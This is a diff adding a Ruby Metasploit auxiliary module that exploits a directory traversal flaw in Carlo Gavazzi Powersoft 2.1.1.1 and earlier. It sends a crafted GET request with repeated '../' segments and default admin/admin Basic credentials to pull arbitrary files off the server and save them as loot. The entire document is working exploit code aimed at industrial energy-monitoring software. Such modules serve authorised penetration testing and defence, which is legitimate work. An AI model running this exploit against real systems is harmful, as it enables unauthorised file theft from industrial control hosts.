@@ -1,0 +1,67 @@
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+	Rank = GreatRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Carlo Gavazzi Powersoft Directory Traversal',
+			'Description'    => %q{
+				This module exploits a directory traversal vulnerability
+				found in Carlo Gavazzi Powersoft <= 2.1.1.1. The vulnerability
+				is triggered when sending a specially crafted GET request to the
+				server. The location parameter of the GET request is not sanitized
+				and the sendCommand.php script will automatically pull down any
+				file requested
+			},
+			'Author'         => [ 'james fitts' ],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					[ 'URL', 'http://gleg.net/agora_scada_upd.shtml']
+				],
+			'DisclosureDate' => 'Jan 21 2015'))
+
+		register_options(
+			[
+				OptInt.new('DEPTH', [ false, 'Levels to reach base directory', 8]),
+				OptString.new('FILE', [ false, 'This is the file to download', 'boot.ini']),
+				OptString.new('USERNAME', [ true, 'Username to authenticate with', 'admin']),
+				OptString.new('PASSWORD', [ true, 'Password to authenticate with', 'admin']),
+				Opt::RPORT(80)
+			], self.class )
+	end
+
+	def run
+
+	require 'base64'
+
+	credentials = Base64.encode64("#{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+
+	depth = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
+	levels = "/" + ("../" * depth)
+
+	res = send_request_raw({
+		'method'	=> 'GET',
+		'uri'		=> "#{levels}#{datastore['FILE']}?res=&valid=true",
+		'headers'	=>	{
+			'Authorization'	=>	"Basic #{credentials}"
+		},
+	})
+
+	if res and res.code == 200
+		loot = res.body
+		if not loot or loot.empty?
+			print_status("File from #{rhost}:#{rport} is empty...")
+			return
+		end
+		file = ::File.basename(datastore['FILE'])
+		path = store_loot('carlo.gavazzi.powersoft.file', 'application/octet-stream', rhost, loot, file, datastore['FILE'])
+		print_status("Stored #{datastore['FILE']} to #{path}")
+		return
+	end
+
+	end
+end
